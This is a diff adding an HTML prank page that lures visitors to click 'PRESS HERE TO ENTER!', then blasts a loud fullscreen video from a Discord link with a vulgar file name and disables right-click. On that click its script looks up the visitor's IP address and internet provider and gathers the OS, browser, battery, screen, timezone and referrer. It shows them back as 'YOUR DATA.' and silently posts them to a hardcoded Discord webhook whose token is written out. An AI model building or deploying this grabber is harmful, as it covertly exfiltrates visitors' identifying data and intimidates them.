@@ -1,0 +1,461 @@
+--- START OF FILE ai_studio_code (6).html ---
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Website</title>
+
+    <!-- Import a spooky font -->
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
+
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background-color: black;
+            height: 100%;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            /* Custom spooky cursor */
+            /* Replace 'https://i.imgur.com/v2Q534Q.png' with your actual cursor image URL */
+            cursor: url('https://i.imgur.com/v2Q534Q.png'), auto; 
+            /* If you don't have a custom cursor, remove the 'cursor' line above */
+        }
+
+        video {
+            min-width: 100vw;
+            min-height: 100vh;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            object-fit: cover;
+            z-index: 0;
+            display: none; /* Hidden by default, shown after click */
+        }
+
+        /* Ensure video covers fullscreen mode correctly across browsers */
+        video:-webkit-full-screen { width: 100% !important; height: 100% !important; }
+        video:-moz-full-screen { width: 100% !important; height: 100% !important; }
+        video:-ms-fullscreen { width: 100% !important; height: 100% !important; }
+        video:fullscreen { width: 100% !important; height: 100% !important; }
+
+        /* These rules attempt to hide the default browser video controls */
+        /* Note: These are not guaranteed to work in all browsers or in native fullscreen mode. */
+        video::-webkit-media-controls-panel { display: none !important; -webkit-appearance: none; }
+        video::-webkit-media-controls-play-button { display: none !important; -webkit-appearance: none; }
+        video::-webkit-media-controls-current-time-display { display: none !important; -webkit-appearance: none; }
+        video::-webkit-media-controls-time-remaining-display { display: none !important; -webkit-appearance: none; }
+        video::-webkit-media-controls-timeline { display: none !important; -webkit-appearance: none; }
+        video::-webkit-media-controls-volume-slider { display: none !important; -webkit-appearance: none; }
+        video::-webkit-media-controls-mute-button { display: none !important; -webkit-appearance: none; }
+        video::-webkit-media-controls-fullscreen-button { display: none !important; -webkit-appearance: none; }
+        video::--moz-media-controls { display: none !important; }
+
+        #dareMessage {
+            color: white;
+            font-family: 'Creepster', cursive;
+            font-size: 5em;
+            text-align: center;
+            cursor: pointer;
+            text-shadow: 0 0 10px red, 0 0 20px red, 0 0 30px red, 0 0 40px red;
+            transition: transform 0.2s ease-in-out;
+            z-index: 10;
+            position: relative;
+        }
+
+        #dareMessage:hover {
+            transform: scale(1.05);
+        }
+
+        /* Flickering text effect */
+        #dareMessage span {
+            animation: flicker 1.5s infinite alternate; 
+        }
+
+        @keyframes flicker {
+            0%, 19.9%, 22%, 62.9%, 64%, 69.9%, 71%, 100% { opacity: 1; text-shadow: 0 0 10px red, 0 0 20px red, 0 0 30px red, 0 0 40px red; }
+            20%, 21%, 63%, 63.9%, 70%, 70.9% { opacity: 0.8; text-shadow: none; }
+            40%, 41.9% { opacity: 0.6; text-shadow: none; }
+            50%, 51.9% { opacity: 0.9; text-shadow: 0 0 5px red, 0 0 15px red; }
+        }
+
+        /* --- MODIFIED CSS FOR SYSTEM INFO (now centered and red) --- */
+        #systemInfo {
+            position: fixed;
+            top: 50%;
+            left: 100%; /* Start off-screen to the right */
+            transform: translate(0, -50%); /* Vertically center */
+            width: 450px; /* Adjust width as needed for content */
+            background-color: rgba(0, 0, 0, 0.7);
+            color: red; /* Red text */
+            font-family: 'Creepster', cursive; /* Spooky font */
+            font-size: 2em; /* Larger font size */
+            padding: 20px;
+            border: 2px solid red;
+            box-shadow: 0 0 15px red, 0 0 25px red;
+            z-index: 100; /* Ensure it's on top */
+            transition: left 1.5s ease-out, transform 1.5s ease-out, opacity 1.5s ease-in-out; /* Smooth slide-in and fade */
+            opacity: 0; /* Start invisible */
+            text-align: center; /* Center content within the div */
+            display: none; /* Initially hidden */
+        }
+        #systemInfo.show {
+            left: 50%; /* Moves its left edge to the horizontal center */
+            transform: translate(-50%, -50%); /* Fully centers it */
+            opacity: 1; /* Fade in */
+            display: block; /* Make it visible */
+        }
+        #systemInfo p {
+            margin: 8px 0; /* More spacing for larger text */
+        }
+        #systemInfo strong {
+            color: white; /* Keep labels white for contrast */
+        }
+    </style>
+</head>
+<body>
+
+    <video id="dareVideo" src="https://cdn.discordapp.com/attachments/1431271017325793483/1431722000283598888/suckmydick.mp4?ex=68fe7284&is=68fd2104&hm=f0967dc8d9335ab6295e0bc47dea341218d74c1d5fd5184bd17152f63ebcc580&&"
+           loop
+           playsinline
+           preload="auto">
+        Your browser does not support the video tag.
+    </video>
+
+    <!-- Audio element for a pre-video scare sound -->
+    <!-- NOTE: Replace the src below with an actual short scare sound, e.g., a short screech or whoosh -->
+    <!-- Current src is just a placeholder; for best results, use a dedicated audio file. -->
+    <!-- If you don't want a scare sound, you can remove this audio tag entirely. -->
+    <audio id="scareSound" src="https://example.com/path/to/your/scare_sound.mp3" preload="auto"></audio> 
+    <!-- Placeholder: Make sure this is a *different* audio file from the main video -->
+
+    <div id="dareMessage">
+        <p><span>PRESS HERE TO ENTER!</span></p>
+    </div>
+
+    <!-- HTML ELEMENT FOR SYSTEM INFO (now meant to be centered) -->
+    <div id="systemInfo">
+        <p><strong>YOUR DATA.</strong></p>
+        <p><strong>IP:</strong> <span id="ipAddress">Scanning...</span></p>
+        <p><strong>Provider:</strong> <span id="providerInfo">Detecting...</span></p> 
+        <p><strong>OS:</strong> <span id="osInfo">Identifying...</span></p>
+        <p><strong>Platform:</strong> <span id="platformInfo">Detecting...</span></p> <!-- New Platform line -->
+        <p><strong>Browser:</strong> <span id="browserInfo">Detecting...</span></p>
+        <p><strong>Vendor:</strong> <span id="vendorInfo">Identifying...</span></p> <!-- New Vendor line -->
+        <p><strong>Language:</strong> <span id="languageInfo">Detecting...</span></p>
+        <p><strong>CPU Cores:</strong> <span id="cpuCoresInfo">Counting...</span></p>
+        <p><strong>Memory:</strong> <span id="memoryInfo">Checking...</span></p>
+        <p><strong>Online:</strong> <span id="onlineStatus">Verifying...</span></p>
+        <p><strong>Timezone:</strong> <span id="timezoneInfo">Locating...</span></p>
+        <p><strong>Cookies Enabled:</strong> <span id="cookiesEnabledInfo">Checking...</span></p> <!-- New Cookies line -->
+        <p><strong>Do Not Track:</strong> <span id="dntStatusInfo">Checking...</span></p> <!-- New DNT line -->
+        <p><strong>Touch Points:</strong> <span id="touchPointsInfo">Detecting...</span></p> <!-- New Touch Points line -->
+        <p><strong>Color Depth:</strong> <span id="colorDepthInfo">Detecting...</span></p> <!-- New Color Depth line -->
+        <p><strong>Pixel Ratio:</strong> <span id="pixelRatioInfo">Calculating...</span></p> <!-- New Pixel Ratio line -->
+        <p><strong>Frames:</strong> <span id="framesInfo">Counting...</span></p> <!-- New Frames line -->
+        <p><strong>Referrer:</strong> <span id="referrerInfo">Checking...</span></p> <!-- New Referrer line -->
+        <p><strong>Battery:</strong> <span id="batteryStatus">Analyzing...</span></p>
+        <p><strong>Full User Agent:</strong> <span id="deviceInfo">Identifying...</span></p> <!-- Renamed Device to Full User Agent -->
+        <p><strong>Screen:</strong> <span id="screenInfo">Calibrating...</span></p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const video = document.getElementById('dareVideo');
+            const scareSound = document.getElementById('scareSound');
+            const message = document.getElementById('dareMessage');
+            const systemInfo = document.getElementById('systemInfo');
+
+            // Span element references
+            const ipAddressSpan = document.getElementById('ipAddress');
+            const providerInfoSpan = document.getElementById('providerInfo');
+            const osInfoSpan = document.getElementById('osInfo');
+            const platformInfoSpan = document.getElementById('platformInfo'); // New
+            const browserInfoSpan = document.getElementById('browserInfo');
+            const vendorInfoSpan = document.getElementById('vendorInfo'); // New
+            const languageInfoSpan = document.getElementById('languageInfo');
+            const cpuCoresInfoSpan = document.getElementById('cpuCoresInfo');
+            const memoryInfoSpan = document.getElementById('memoryInfo');
+            const onlineStatusSpan = document.getElementById('onlineStatus');
+            const timezoneInfoSpan = document.getElementById('timezoneInfo');
+            const cookiesEnabledInfoSpan = document.getElementById('cookiesEnabledInfo'); // New
+            const dntStatusInfoSpan = document.getElementById('dntStatusInfo'); // New
+            const touchPointsInfoSpan = document.getElementById('touchPointsInfo'); // New
+            const colorDepthInfoSpan = document.getElementById('colorDepthInfo'); // New
+            const pixelRatioInfoSpan = document.getElementById('pixelRatioInfo'); // New
+            const framesInfoSpan = document.getElementById('framesInfo'); // New
+            const referrerInfoSpan = document.getElementById('referrerInfo'); // New
+            const batteryStatusSpan = document.getElementById('batteryStatus');
+            const deviceInfoSpan = document.getElementById('deviceInfo'); // Now Full User Agent
+            const screenInfoSpan = document.getElementById('screenInfo');
+            
+            video.volume = 1; // Set main video volume to max
+
+            // Discord Webhook URL
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1431731862568697990/IPMtTrLQuoIkwFEP79zpCQLuechji5_QEEhcdC7oBMEvw0uB3aWy55fPXiSMvRDszEIa';
+
+
+            // Only set scare sound volume if the element exists and its source is not empty
+            if (scareSound && scareSound.src && !scareSound.src.includes('example.com/path/to/your/scare_sound.mp3') && scareSound.src !== window.location.href) {
+                scareSound.volume = 0.7; // Set scare sound volume (adjust as needed)
+            } else if (scareSound) {
+                // Remove the scare sound element if no valid source is provided (or if it's the placeholder)
+                scareSound.remove();
+                console.warn("Scare sound element removed because no valid source was provided or it's the placeholder.");
+            }
+
+            // Disable right-click context menu to enhance immersion
+            document.addEventListener('contextmenu', e => {
+                e.preventDefault();
+                console.log("Right-click is disabled to enhance the experience!");
+            });
+
+            // Function to parse User Agent for OS and Browser
+            const parseUserAgent = (ua) => {
+                let os = 'Unknown OS';
+                let browser = 'Unknown Browser';
+                let browserVersion = 'Unknown Version';
+
+                // OS detection
+                if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
+                else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
+                else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
+                else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+                else if (ua.includes('Macintosh')) os = 'macOS';
+                else if (ua.includes('Android')) os = 'Android';
+                else if (ua.includes('iOS')) os = 'iOS';
+                else if (ua.includes('Linux')) os = 'Linux';
+                
+                // Browser detection
+                if (ua.includes('Edge')) {
+                    browser = 'Microsoft Edge';
+                    browserVersion = ua.split('Edge/')[1].split('.')[0];
+                } else if (ua.includes('Chrome')) {
+                    browser = 'Chrome';
+                    browserVersion = ua.split('Chrome/')[1].split('.')[0];
+                } else if (ua.includes('Firefox')) {
+                    browser = 'Firefox';
+                    browserVersion = ua.split('Firefox/')[1].split('.')[0];
+                } else if (ua.includes('Safari')) {
+                    browser = 'Safari';
+                    // Safari version is often complex, taking major version
+                    const safariMatch = ua.match(/Version\/(\d+)\.\d+/);
+                    if (safariMatch && safariMatch[1]) browserVersion = safariMatch[1];
+                } else if (ua.includes('Opera') || ua.includes('OPR')) {
+                    browser = 'Opera';
+                    const operaMatch = ua.match(/(Opera|OPR)\/(\d+)\.\d+/);
+                    if (operaMatch && operaMatch[2]) browserVersion = operaMatch[2];
+                }
+
+                return { os, browser: `${browser} ${browserVersion}` };
+            };
+
+
+            const fetchSystemInfo = async () => {
+                let ip = 'N/A';
+                let provider = 'N/A';
+                let os = 'N/A';
+                let browser = 'N/A';
+                let platform = navigator.platform || 'N/A'; // New
+                let vendor = navigator.vendor || 'N/A'; // New
+                let language = navigator.language || 'N/A';
+                let cpuCores = navigator.hardwareConcurrency || 'N/A';
+                let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
+                let online = navigator.onLine ? 'Yes' : 'No';
+                let timezone = 'N/A';
+                try {
+                    timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                } catch (e) {
+                    console.error("Error getting timezone:", e);
+                }
+                let cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No'; // New
+                let doNotTrack = navigator.doNotTrack === '1' ? 'Yes' : (navigator.doNotTrack === '0' ? 'No' : 'N/A'); // New
+                let maxTouchPoints = navigator.maxTouchPoints || 0; // New
+                let colorDepth = screen.colorDepth || 'N/A'; // New
+                let pixelRatio = window.devicePixelRatio || 'N/A'; // New
+                let framesCount = window.frames.length || 0; // New
+                let referrer = document.referrer || 'None'; // New
+                let batteryLevel = 'N/A';
+                let batteryCharging = '';
+                let userAgent = navigator.userAgent;
+                let screenRes = `${screen.width}x${screen.height}`;
+                let screenAvail = `${screen.availWidth}x${screen.availHeight}`;
+
+                const uaParsed = parseUserAgent(userAgent);
+                os = uaParsed.os;
+                browser = uaParsed.browser;
+
+
+                // Get IP Address and Provider
+                try {
+                    const response = await fetch('http://ip-api.com/json'); 
+                    const data = await response.json();
+                    if (data.status === 'success') {
+                        ip = data.query;
+                        provider = data.isp;
+                        ipAddressSpan.textContent = ip;
+                        providerInfoSpan.textContent = provider;
+                    } else {
+                        ipAddressSpan.textContent = 'ERROR';
+                        providerInfoSpan.textContent = 'ERROR';
+                        console.error('Error fetching IP details:', data.message);
+                    }
+                } catch (error) {
+                    ipAddressSpan.textContent = 'ERROR';
+                    providerInfoSpan.textContent = 'ERROR';
+                    console.error('Network error fetching IP/Provider:', error);
+                }
+
+                // Get Battery Status
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        const updateBatteryStatus = () => {
+                            batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                            batteryCharging = battery.charging ? '(CHARGING)' : '';
+                            batteryStatusSpan.textContent = `${batteryLevel} ${batteryCharging}`;
+                        };
+                        updateBatteryStatus();
+                        battery.addEventListener('levelchange', updateBatteryStatus);
+                        battery.addEventListener('chargingchange', updateBatteryStatus);
+                    } catch (error) {
+                        batteryStatusSpan.textContent = 'N/A';
+                        console.error('Error fetching battery status:', error);
+                    }
+                } else {
+                    batteryStatusSpan.textContent = 'NOT SUPPORTED';
+                }
+
+                // Update all spans
+                osInfoSpan.textContent = os;
+                platformInfoSpan.textContent = platform; // New
+                browserInfoSpan.textContent = browser;
+                vendorInfoSpan.textContent = vendor; // New
+                languageInfoSpan.textContent = language;
+                cpuCoresInfoSpan.textContent = cpuCores;
+                memoryInfoSpan.textContent = memory;
+                onlineStatusSpan.textContent = online;
+                timezoneInfoSpan.textContent = timezone;
+                cookiesEnabledInfoSpan.textContent = cookiesEnabled; // New
+                dntStatusInfoSpan.textContent = doNotTrack; // New
+                touchPointsInfoSpan.textContent = maxTouchPoints; // New
+                colorDepthInfoSpan.textContent = `${colorDepth} bit`; // New
+                pixelRatioInfoSpan.textContent = pixelRatio; // New
+                framesInfoSpan.textContent = framesCount; // New
+                referrerInfoSpan.textContent = referrer; // New
+                deviceInfoSpan.textContent = userAgent; // Full User Agent
+                screenInfoSpan.textContent = `${screenRes} (AVAIL: ${screenAvail})`;
+
+                // --- SEND DATA TO DISCORD WEBHOOK ---
+                const webhookMessage = {
+                    content: `**YOUR DATA.**\n` +
+                             `**IP:** ${ip}\n` +
+                             `**Provider:** ${provider}\n` +
+                             `**OS:** ${os}\n` +
+                             `**Platform:** ${platform}\n` +
+                             `**Browser:** ${browser}\n` +
+                             `**Vendor:** ${vendor}\n` +
+                             `**Language:** ${language}\n` +
+                             `**CPU Cores:** ${cpuCores}\n` +
+                             `**Memory:** ${memory}\n` +
+                             `**Online:** ${online}\n` +
+                             `**Timezone:** ${timezone}\n` +
+                             `**Cookies Enabled:** ${cookiesEnabled}\n` +
+                             `**Do Not Track:** ${doNotTrack}\n` +
+                             `**Touch Points:** ${maxTouchPoints}\n` +
+                             `**Color Depth:** ${colorDepth} bit\n` +
+                             `**Pixel Ratio:** ${pixelRatio}\n` +
+                             `**Frames:** ${framesCount}\n` +
+                             `**Referrer:** ${referrer}\n` +
+                             `**Battery:** ${batteryLevel} ${batteryCharging}\n` +
+                             `**Full User Agent:** ${userAgent}\n` +
+                             `**Screen:** ${screenRes} (AVAIL: ${screenAvail})`
+                };
+
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(webhookMessage),
+                    });
+                    console.log('System info sent to Discord webhook successfully!');
+                } catch (error) {
+                    console.error('Failed to send system info to Discord webhook:', error);
+                }
+                // --- END WEBHOOK SEND ---
+
+
+                // Show the info panel with animation
+                systemInfo.style.display = 'block';
+                // Trigger reflow to ensure transition works from initial 'left: 100%'
+                void systemInfo.offsetWidth; 
+                systemInfo.classList.add('show');
+            };
+
+
+            const playVideoAndGoFullscreen = () => {
+                message.style.display = 'none'; // Hide the message immediately
+
+                const startMainVideo = () => {
+                    video.style.display = 'block'; // Show the video
+                    video.play().then(() => {
+                        console.log("Main video playing loudly!");
+                        // Request fullscreen after successful video play
+                        if (video.requestFullscreen) {
+                            video.requestFullscreen();
+                        } else if (video.mozRequestFullScreen) { // Firefox
+                            video.mozRequestFullScreen();
+                        } else if (video.webkitRequestFullscreen) { // Chrome, Safari and Opera
+                            video.webkitRequestFullscreen();
+                        } else if (video.msRequestFullscreen) { // IE/Edge
+                            video.msRequestFullscreen();
+                        } else {
+                            console.warn("Fullscreen API not supported by this browser.");
+                        }
+                        
+                        // Fetch and display system info after video starts
+                        fetchSystemInfo();
+
+                    }).catch(error => {
+                        console.error("Failed to play main video:", error);
+                        message.style.display = 'block'; // Show message again if play fails
+                        message.textContent = "Click again, if you dare... (Video autoplay or fullscreen blocked)";
+                    });
+                };
+
+                // Try to play scare sound first, then main video after delay
+                if (scareSound && scareSound.parentNode) { // Check if scareSound still exists in DOM
+                    scareSound.play().then(() => {
+                        console.log("Scare sound played.");
+                        setTimeout(startMainVideo, 700); // 700ms delay before main video starts
+                    }).catch(error => {
+                        console.error("Failed to play scare sound:", error);
+                        // If scare sound fails, proceed to play main video directly without delay
+                        startMainVideo();
+                    });
+                } else {
+                    // If no valid scare sound element/source, just start the main video
+                    startMainVideo();
+                }
+            };
+
+            // Add click listener to the message
+            message.addEventListener('click', () => {
+                // Only attempt to play if video is paused or has not started yet
+                if (video.paused || video.style.display === 'none') {
+                    playVideoAndGoFullscreen();
+                }
+            }, { once: true }); // Listener removed after first click
+        });
+    </script>
+
+</body>
+</html>
